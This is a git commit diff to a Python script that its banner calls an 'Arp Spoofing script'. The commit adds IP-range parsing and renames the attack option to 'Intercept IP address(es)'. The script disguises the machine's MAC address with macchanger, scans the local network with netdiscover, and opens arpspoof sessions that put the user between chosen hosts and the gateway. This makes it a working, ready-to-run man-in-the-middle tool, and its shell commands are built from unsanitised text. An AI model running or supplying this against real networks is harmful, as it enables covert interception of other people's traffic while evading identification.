acb976feb9df7ee4d8de3e16cf2f7f0175a07032
root <root@localhost.localdomain>
2018-10-16 20:18:25 +0000

    Fix Bug #1, 2. Enhancement #1

--- arpspf.py
+++ arpspf.py
@@ -5,10 +5,11 @@ import shlex
 from pathlib import Path
 from time import sleep
 
-NETDCR_TXT = 'netdiscover.txt'
-IPADDR_TXT = 'ipaddress.txt'
+NETDCR_TXT = 'netdiscover'
+IPADDR_TXT = 'ipaddress'
 ERROR_CODE = 999
-def run_command(command):
+
+def runcmdgetoutput(command):
     listoutput = []
     process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
     while True:
@@ -19,74 +20,88 @@ def run_command(command):
             listoutput.append(output.strip())
     return listoutput
 
-def run_command2(command):
+def runcmd(command):
     subprocess.run(command, stdout=subprocess.PIPE, shell=True)
 
 def ip_input(value):
-    resultlist = []
+    rslst = []
     try:
-        if '-' in value:
+        if '-' in value and ',' in value:
+            fstlst = value.split(',')
+            for item1 in fstlst:
+                if '-' in item1:
+                    num1 = int(item1.split('-')[0].strip())
+                    num2 = int(item1.split('-')[1].strip())
+                    for item2 in range(num1, num2+1):
+                        rslst.append(item2)
+                else:
+                    rslst.append(int(item1.strip()))
+
+        elif '-' in value:
             first = int(value.split('-')[0].strip())
             second = int(value.split('-')[1].strip())
             for var in range(first, second+1):
-                resultlist.append(var)
+                rslst.append(var)
+
         elif ',' in value:
             for var in value.split(','):
                 number = int(var.strip())
-                resultlist.append(number)
-        else:
-            resultlist.append(int(value))
-    except ValueError:
-        resultlist.append(ERROR_CODE)
+                rslst.append(number)
 
-    return resultlist
+        else:
+            rslst.append(int(value))
+    except ValueError:
+        rslst.append(ERROR_CODE)
+
+    rslst = list(set(rslst))
+    return rslst
 
 def choose_step():
-    print(' ')
+    print('**************************************************************')
     checkmac = 'unchange'
     if (currmac != permmac):
         checkmac = 'changed'
     print('Your IP: {}, Interface: {}'.format(yourIP, interface))
     print('Gateway: {}, Current MAC: {} {}'.format(gateway, currmac, checkmac))
-    print('***********************************************')
+    print('**************************************************************')
     print('1. Change my MAC address (Recommendation!)')
     print('2. Scan my network')
-    print('3. Arp Spoof ip address')
+    print('3. Intercept IP address(es)')
     print('0. Exit')
-    print('***********************************************')
+    print('**************************************************************')
     try:
         var = int(input())
     except ValueError:
         var = ERROR_CODE
     return var
 
-iproute = run_command('ip route')
+iproute = runcmdgetoutput('ip route')
 gateway = iproute[0].split(" ")[2]
 interface = iproute[0].split(" ")[4]
 rangeIP = iproute[1].split(" ")[0]
 yourIP = iproute[1].split(" ")[8]
-macchanger = run_command('macchanger -s ' + interface)
+macchanger = runcmdgetoutput('macchanger -s ' + interface)
 currmac = macchanger[0].split(" ")[4]
 permmac = macchanger[1].split(" ")[2]
 
 print(' ')
-print('***********************************************')
-print('*****************Minh*Nguyen*******************')
-print('***********************************************')
-print('Welcome to Arp Spoofing script! Please select: ')
+print('**************************************************************')
+print('*************************Minh*Nguyen**************************')
+print('**************************************************************')
+print('!!!!!!!!!!!!!!!!Welcome to Arp Spoofing script!!!!!!!!!!!!!!!!')
 
 while True:
     step = choose_step()
     if step == 1: # 1. Change my MAC address
-        run_command2('ifconfig ' + interface + ' down')
-        result = run_command('macchanger -r ' + interface)
-        run_command2('ifconfig ' + interface + ' up')
-        run_command2('service network-manager restart')
+        runcmd('ifconfig ' + interface + ' down')
+        result = runcmdgetoutput('macchanger -r ' + interface)
+        runcmd('ifconfig ' + interface + ' up')
+        runcmd('service network-manager restart')
         currmac = result[2].split(" ")[8]
         sleep(1)
 
     elif step == 2: # 2. Scan my network
-        run_command2('gnome-terminal -- /bin/bash -c \'netdiscover -r {} | tee {}\''.format(rangeIP, NETDCR_TXT))
+        runcmd('gnome-terminal -- /bin/bash -c \'netdiscover -r {} | tee {}\''.format(rangeIP, NETDCR_TXT))
 
     elif step == 3: # 3. Arp Spoof ip address
         
@@ -95,8 +110,8 @@ while True:
             print('Please run Step 2.')
             continue
 
-        run_command2('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" ' + NETDCR_TXT + ' | sort -u > ' + IPADDR_TXT)
-        iplist = []
+        runcmd('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" ' + NETDCR_TXT + ' | sort -u > ' + IPADDR_TXT)
+        iplst = []
         with open(IPADDR_TXT, 'r') as fin:
             i = 1
             for line in fin:
@@ -104,20 +119,20 @@ while True:
                 if gateway != line:
                     print(i, 'Ip:', line)
                     i = i+1;
-                    iplist.append(line)
+                    iplst.append(line)
 
-        print('Please select IP address(es) (Ex: 1; 1-3; or 1,2) ([0] to quit): ')
+        print('Please select IP address(es) (Ex: 1; 1,4; 1-3; or 1-3,4) ([0] to quit): ')
         while True:
             var = input()
-            resultlist = ip_input(var)
-            if max(resultlist) <= len(iplist):
+            rslst = ip_input(var)
+            if max(rslst) <= len(iplst):
                 break	
 
-        if resultlist[0] == 0:
+        if min(rslst) == 0:
             continue
 
-        for ipnum in resultlist:
-            run_command2('gnome-terminal -- arpspoof -i {} -t {} -r {}'.format(interface, iplist[ipnum-1],gateway))
+        for ipnum in rslst:
+            runcmd('gnome-terminal -- arpspoof -i {} -t {} -r {}'.format(interface, iplst[ipnum-1],gateway))
     elif step == 0: # 0. Remove residual files and Exit
         netdctxt = Path(NETDCR_TXT)
         if netdctxt.is_file():
